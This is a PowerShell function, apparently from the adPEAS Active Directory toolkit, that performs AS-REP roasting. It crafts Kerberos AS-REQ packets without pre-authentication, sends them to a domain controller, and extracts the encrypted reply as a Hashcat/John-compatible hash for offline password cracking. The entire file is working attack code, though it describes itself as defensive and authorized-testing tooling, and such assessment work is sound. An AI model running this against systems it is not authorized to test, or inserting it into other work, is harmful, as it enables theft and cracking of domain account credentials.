function Invoke-ASREPRoast {
<#
.SYNOPSIS
    Tests if an AS-REP Roastable account can actually be AS-REP Roasted and extracts the hash.

.DESCRIPTION
    This function sends AS-REQ requests (without pre-authentication) for accounts with DONT_REQ_PREAUTH flag and extracts the AS-REP response hash.

    Uses raw Kerberos protocol (UDP/TCP port 88) to communicate with KDC.

    This is 100% defensive security - used for:
    - Security auditing
    - Penetration testing (with authorization)
    - Password policy compliance testing
    - Identifying weak passwords before attackers do

    Encryption Types:
    - etype 23 (RC4-HMAC) = CRITICAL - Very fast to crack
    - etype 17 (AES128) = HIGH - Harder to crack
    - etype 18 (AES256) = MEDIUM - Strongest encryption

    Hash Format:
    - Output: $krb5asrep$etype$user@realm:checksum$encrypted_part
    - Compatible with Hashcat (mode 18200)
    - Compatible with John the Ripper

.PARAMETER SAMAccountName
    The SAMAccountName of the user with DONT_REQ_PREAUTH flag

.PARAMETER Domain
    The domain name (FQDN). If not specified, uses the domain from the active session ($Script:LDAPContext.Domain).

.PARAMETER DomainController
    Optional: Specific DC to query. If not specified, uses the DC from the active session ($Script:LDAPContext.Server) or auto-discovers via SRV records.

.EXAMPLE
    Invoke-ASREPRoast -SAMAccountName "vulnuser" -Domain "contoso.com"

.EXAMPLE
    # With active session (Domain/DC from Connect-adPEAS)
    Invoke-ASREPRoast -SAMAccountName "vulnuser"

.OUTPUTS
    PSCustomObject with test results including encryption type and hash

.NOTES
    Author: Alexander Sturz (@_61106960_)
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$SAMAccountName,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$DomainController
    )

    begin {
        Write-Log "[Invoke-ASREPRoast] Starting AS-REP Roast test for $SAMAccountName"

        # Build Kerberos AS-REQ (without pre-auth)
        function New-KerberosASREQ {
            param(
                [string]$Username,
                [string]$Realm
            )

            # pvno [1] INTEGER (5)
            $pvno = New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value @(5))

            # msg-type [2] INTEGER (10 = AS-REQ)
            $msgType = New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value @(10))

            # KDC-Options [0] BIT STRING (forwardable, renewable, renewable-ok)
            # 0x40000000 = forwardable, 0x00800000 = renewable, 0x00000010 = renewable-ok
            # Combined: 0x40800010
            $kdcOptions = @(0x03, 0x05, 0x00, 0x40, 0x80, 0x00, 0x10)
            $kdcOptionsTag = New-ASN1ContextTag -Tag 0 -Data $kdcOptions

            # cname [1] PrincipalName
            # PrincipalName ::= SEQUENCE {
            #     name-type [0] Int32 (1 = NT-PRINCIPAL)
            #     name-string [1] SEQUENCE OF GeneralString
            # }
            $nameType = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value @(1))
            $nameString = New-ASN1Sequence -Data (New-ASN1GeneralString -Value $Username)
            $nameStringTag = New-ASN1ContextTag -Tag 1 -Data $nameString
            $principalName = New-ASN1Sequence -Data ($nameType + $nameStringTag)
            $cnameTag = New-ASN1ContextTag -Tag 1 -Data $principalName

            # realm [2] Realm (GeneralString)
            $realmTag = New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $Realm.ToUpper())

            # sname [3] PrincipalName (krbtgt/REALM)
            $snameType = New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value @(2))  # NT-SRV-INST
            $snameString1 = New-ASN1GeneralString -Value "krbtgt"
            $snameString2 = New-ASN1GeneralString -Value $Realm.ToUpper()
            $snameStringSeq = New-ASN1Sequence -Data ($snameString1 + $snameString2)
            $snameStringTag = New-ASN1ContextTag -Tag 1 -Data $snameStringSeq
            $snamePrincipal = New-ASN1Sequence -Data ($snameType + $snameStringTag)
            $snameTag = New-ASN1ContextTag -Tag 3 -Data $snamePrincipal

            # till [5] KerberosTime (20370913024805Z = far future)
            # KerberosTime is GeneralizedTime (tag 0x18), NOT GeneralString (tag 0x1B)
            $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)
            $tillTag = New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)

            # nonce [7] UInt32 (random)
            $nonce = Get-Random -Minimum 1 -Maximum 2147483647
            $nonceBytes = [System.BitConverter]::GetBytes([uint32]$nonce)
            [Array]::Reverse($nonceBytes)
            $nonceTag = New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $nonceBytes)

            # etype [8] SEQUENCE OF Int32 (23, 18, 17 = RC4, AES256, AES128)
            $etype23 = New-ASN1Integer -Value @(23)
            $etype18 = New-ASN1Integer -Value @(18)
            $etype17 = New-ASN1Integer -Value @(17)
            $etypeSeq = New-ASN1Sequence -Data ($etype23 + $etype18 + $etype17)
            $etypeTag = New-ASN1ContextTag -Tag 8 -Data $etypeSeq

            # Build KDC-REQ-BODY
            $kdcReqBody = $kdcOptionsTag + $cnameTag + $realmTag + $snameTag + $tillTag + $nonceTag + $etypeTag
            $kdcReqBodySeq = New-ASN1Sequence -Data $kdcReqBody
            $kdcReqBodyTag = New-ASN1ContextTag -Tag 4 -Data $kdcReqBodySeq

            # Build AS-REQ
            $asReq = $pvno + $msgType + $kdcReqBodyTag
            $asReqSeq = New-ASN1Sequence -Data $asReq
            $asReqApp = New-ASN1ApplicationTag -Tag 10 -Data $asReqSeq

            return $asReqApp
        }
    }

    process {
        try {
            # Resolve Domain and DomainController from active session if not provided
            if (-not $Domain) {
                if ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
                    $Domain = $Script:LDAPContext.Domain
                    Write-Log "[Invoke-ASREPRoast] Using domain from active session: $Domain"
                } else {
                    Write-Error "[Invoke-ASREPRoast] -Domain is required when no active session exists. Use Connect-adPEAS first or provide -Domain."
                    return [PSCustomObject]@{
                        SAMAccountName = $SAMAccountName
                        Success = $false
                        EncryptionType = $null
                        EncryptionTypeName = "N/A"
                        Severity = "Unknown"
                        Hash = $null
                        Error = "No domain specified and no active session. Use Connect-adPEAS first or provide -Domain."
                    }
                }
            }

            if (-not $DomainController -and $Script:LDAPContext -and $Script:LDAPContext.Server) {
                $DomainController = $Script:LDAPContext.Server
                Write-Log "[Invoke-ASREPRoast] Using DC from active session: $DomainController"
            }

            Write-Log "[Invoke-ASREPRoast] Testing AS-REP Roastability for $SAMAccountName@$Domain"

            # Resolve Domain Controller using unified resolver
            # If -DomainController is explicit, just resolve that hostname to IP (skip DC discovery)
            # If -DomainController is not set, use domain-based DC discovery via SRV records
            if ($DomainController) {
                $ResolvedIP = Resolve-adPEASName -Name $DomainController
                $dcResolution = [PSCustomObject]@{ Hostname = $DomainController; IP = $ResolvedIP }
            } else {
                $dcResolution = Resolve-adPEASName -Domain $Domain
            }
            $DomainController = $dcResolution.Hostname
            $ResolvedIP = $dcResolution.IP

            Write-Log "[Invoke-ASREPRoast] DC resolved: $DomainController (IP: $ResolvedIP)"

            # Determine the target for network connections (prefer IP if available)
            $KdcTarget = if ($ResolvedIP) { $ResolvedIP } else { $DomainController }
            Write-Log "[Invoke-ASREPRoast] KDC target for connections: $KdcTarget"

            # Build AS-REQ
            Write-Log "[Invoke-ASREPRoast] Building AS-REQ for $SAMAccountName"
            $asReqBytes = New-KerberosASREQ -Username $SAMAccountName -Realm $Domain

            # Send AS-REQ to KDC (Port 88 UDP/TCP)
            Write-Log "[Invoke-ASREPRoast] Sending AS-REQ to $KdcTarget`:88"

            $responseBytes = $null
            $success = $false

            # Try TCP first (more reliable for large responses)
            $tcpClient = $null
            $stream = $null
            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.ReceiveTimeout = 5000
                $tcpClient.SendTimeout = 5000
                Write-Log "[Invoke-ASREPRoast] Connecting to $KdcTarget port 88..."
                $tcpClient.Connect($KdcTarget, 88)
                $stream = $tcpClient.GetStream()
                $stream.ReadTimeout = 5000
                $stream.WriteTimeout = 5000

                # Kerberos TCP format: 4-byte length prefix + message
                $lengthBytes = [System.BitConverter]::GetBytes([uint32]$asReqBytes.Length)
                [Array]::Reverse($lengthBytes)
                $stream.Write($lengthBytes, 0, 4)
                $stream.Write($asReqBytes, 0, $asReqBytes.Length)
                $stream.Flush()
                Write-Log "[Invoke-ASREPRoast] Sent $($asReqBytes.Length) bytes AS-REQ"

                # Read response length (4 bytes)
                $responseLengthBytes = New-Object byte[] 4
                $readCount = $stream.Read($responseLengthBytes, 0, 4)
                if ($readCount -ne 4) {
                    throw "Failed to read response length header (got $readCount bytes)"
                }
                [Array]::Reverse($responseLengthBytes)
                $responseLength = [System.BitConverter]::ToUInt32($responseLengthBytes, 0)
                Write-Log "[Invoke-ASREPRoast] Response length: $responseLength bytes"

                if ($responseLength -eq 0 -or $responseLength -gt 65535) {
                    throw "Invalid response length: $responseLength"
                }

                # Read response body
                $responseBytes = New-Object byte[] $responseLength
                $bytesRead = 0
                while ($bytesRead -lt $responseLength) {
                    $chunk = $stream.Read($responseBytes, $bytesRead, $responseLength - $bytesRead)
                    if ($chunk -eq 0) {
                        throw "Connection closed while reading response (got $bytesRead of $responseLength bytes)"
                    }
                    $bytesRead += $chunk
                }

                $success = $true
                Write-Log "[Invoke-ASREPRoast] Received AS-REP ($responseLength bytes)"

            } catch {
                Write-Log "[Invoke-ASREPRoast] TCP failed: $_"
            } finally {
                if ($stream) { try { $stream.Close() } catch { } }
                if ($tcpClient) { try { $tcpClient.Close() } catch { } }
            }

            # If TCP failed or returned 0-length response, try UDP
            if (-not $success) {
                Write-Log "[Invoke-ASREPRoast] Trying UDP..."
                $udpClient = $null
                try {
                    $udpClient = New-Object System.Net.Sockets.UdpClient
                    $udpClient.Client.ReceiveTimeout = 5000
                    $udpClient.Client.SendTimeout = 5000

                    # UDP Kerberos: no length prefix, just the raw message
                    $udpClient.Send($asReqBytes, $asReqBytes.Length, $KdcTarget, 88) | Out-Null
                    Write-Log "[Invoke-ASREPRoast] Sent $($asReqBytes.Length) bytes via UDP to $KdcTarget`:88"

                    # Receive response
                    $remoteEP = New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any, 0)
                    $responseBytes = $udpClient.Receive([ref]$remoteEP)

                    if ($responseBytes -and $responseBytes.Length -gt 0) {
                        $success = $true
                        Write-Log "[Invoke-ASREPRoast] Received $($responseBytes.Length) bytes via UDP"
                    }
                } catch {
                    Write-Log "[Invoke-ASREPRoast] UDP failed: $_"
                } finally {
                    if ($udpClient) { try { $udpClient.Close() } catch { } }
                }
            }

            if (-not $success) {
                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $null
                    EncryptionTypeName = "N/A"
                    Severity = "Unknown"
                    Hash = $null
                    Error = "Failed to receive AS-REP response from KDC (TCP and UDP failed)"
                }
            }

            # Parse AS-REP to extract encrypted part
            Write-Log "[Invoke-ASREPRoast] Parsing AS-REP response"

            # First check if response is KRB-ERROR (Application tag 30 = 0x7E)
            if ($responseBytes.Length -gt 2 -and $responseBytes[0] -eq 0x7E) {
                # This is a KRB-ERROR response, extract error code using proper ASN.1 parsing
                # KRB-ERROR ::= [APPLICATION 30] SEQUENCE { ... error-code [6] Int32 ... }
                $errorCode = $null
                try {
                    $krbError = Read-ASN1Element -Data $responseBytes -Offset 0
                    if ($krbError -and $krbError.Content) {
                        $innerSeq = Read-ASN1Element -Data $krbError.Content -Offset 0
                        if ($innerSeq -and $innerSeq.Content) {
                            $children = Read-ASN1Children -Data $innerSeq.Content
                            foreach ($child in $children) {
                                # error-code is context tag [6]
                                if ($child.TagNumber -eq 6) {
                                    $intElement = Read-ASN1Element -Data $child.Content -Offset 0
                                    if ($intElement -and $intElement.Content) {
                                        $errorCode = [int](Read-ASN1Integer -Content $intElement.Content)
                                    }
                                    break
                                }
                            }
                        }
                    }
                } catch {
                    Write-Log "[Invoke-ASREPRoast] Failed to parse KRB-ERROR with ASN.1: $_"
                }

                # Use centralized Kerberos error code mapping
                $errorMessage = Get-KerberosErrorMessage -ErrorCode $errorCode

                Write-Log "[Invoke-ASREPRoast] KDC returned error: $errorMessage"

                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $null
                    EncryptionTypeName = "N/A"
                    Severity = "Unknown"
                    Hash = $null
                    Error = $errorMessage
                }
            }

            $encryptionType = $null
            $encryptedPart = $null

            # Parse AS-REP using proper ASN.1 parsing (same approach as Invoke-KerberosAuth)
            # AS-REP structure: [APPLICATION 11] SEQUENCE { ... enc-part [6] EncryptedData }
            # EncryptedData: SEQUENCE { etype [0] INTEGER, kvno [1] INTEGER OPTIONAL, cipher [2] OCTET STRING }
            try {
                $root = Read-ASN1Element -Data $responseBytes -Offset 0
                Write-Log "[Invoke-ASREPRoast] Root tag: $($root.Tag) (masked: $($root.Tag -band 0x1F))"

                # AS-REP is [APPLICATION 11]
                if (($root.Tag -band 0x1F) -ne 11) {
                    throw "Unexpected response type: $($root.Tag)"
                }

                # AS-REP is [APPLICATION 11] which wraps a SEQUENCE
                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                $children = Read-ASN1Children -Data $innerSeq.Content

                foreach ($child in $children) {
                    # enc-part is context tag [6]
                    if ($child.TagNumber -eq 6) {
                        # Parse EncryptedData SEQUENCE
                        $encPartSeq = Read-ASN1Element -Data $child.Content
                        $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content

                        foreach ($encChild in $encPartChildren) {
                            if ($encChild.TagNumber -eq 0) {
                                # etype [0] INTEGER
                                # Cast to [int] for hashtable lookup compatibility (Read-ASN1Integer returns Int64)
                                $encryptionType = [int](Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content)
                                Write-Log "[Invoke-ASREPRoast] Found etype: $encryptionType"
                            }
                            elseif ($encChild.TagNumber -eq 2) {
                                # cipher [2] OCTET STRING
                                $encryptedPart = (Read-ASN1Element -Data $encChild.Content).Content
                                Write-Log "[Invoke-ASREPRoast] Extracted encrypted part ($($encryptedPart.Length) bytes)"
                            }
                        }
                    }
                }
            }
            catch {
                Write-Log "[Invoke-ASREPRoast] ASN.1 parsing error: $_"
            }

            if (-not $encryptedPart -or -not $encryptionType) {
                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $encryptionType
                    EncryptionTypeName = if ($encryptionType -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) { $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name } else { "Unknown" }
                    Severity = "Unknown"
                    Hash = $null
                    Error = "Failed to extract encrypted part from AS-REP"
                }
            }

            # Format hash for Hashcat/John
            # Format: $krb5asrep$etype$user@realm:checksum$encrypted_part
            # RC4 (etype 23): checksum is first 16 bytes (HMAC-MD5)
            # AES (etype 17/18): checksum is last 12 bytes (truncated HMAC-SHA1)
            $checksumLength = if ($encryptionType -eq 23) { $Script:HMAC_MD5_SIZE } else { $Script:AES_CHECKSUM_SIZE }

            if ($encryptedPart.Length -lt $checksumLength) {
                return [PSCustomObject]@{
                    SAMAccountName = $SAMAccountName
                    Success = $false
                    EncryptionType = $encryptionType
                    EncryptionTypeName = if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) { $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name } else { "Unknown" }
                    Severity = "Unknown"
                    Hash = $null
                    Error = "Encrypted part too short"
                }
            }

            if ($encryptionType -eq 23) {
                # RC4-HMAC: checksum at beginning
                $checksum = $encryptedPart[0..($checksumLength - 1)]
                $encrypted = $encryptedPart[$checksumLength..($encryptedPart.Length - 1)]
            } else {
                # AES: checksum at end (last 12 bytes)
                $encrypted = $encryptedPart[0..($encryptedPart.Length - $checksumLength - 1)]
                $checksum = $encryptedPart[($encryptedPart.Length - $checksumLength)..($encryptedPart.Length - 1)]
            }

            $checksumHex = ($checksum | ForEach-Object { $_.ToString("x2") }) -join ''
            $encryptedHex = ($encrypted | ForEach-Object { $_.ToString("x2") }) -join ''

            $hash = "`$krb5asrep`$$encryptionType`$$SAMAccountName@$($Domain.ToUpper()):$checksumHex`$$encryptedHex"

            # Determine severity
            $encryptionTypeName = "Unknown"
            $severity = "Unknown"
            $description = "Unknown encryption type"

            if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($encryptionType)) {
                $encryptionTypeName = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Name
                $severity = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Severity
                $description = $Script:KERBEROS_ENCRYPTION_TYPES[$encryptionType].Description
            }

            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                Success = $true
                EncryptionType = $encryptionType
                EncryptionTypeName = $encryptionTypeName
                Severity = $severity
                Description = $description
                Hash = $hash
                Error = $null
            }

        } catch {
            Write-Log "[Invoke-ASREPRoast] Error: $_"
            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                Success = $false
                EncryptionType = $null
                EncryptionTypeName = "N/A"
                Severity = "Unknown"
                Hash = $null
                Error = $_.Exception.Message
            }
        }
    }

    end {
        Write-Log "[Invoke-ASREPRoast] AS-REP Roast test completed for $SAMAccountName"
    }
}
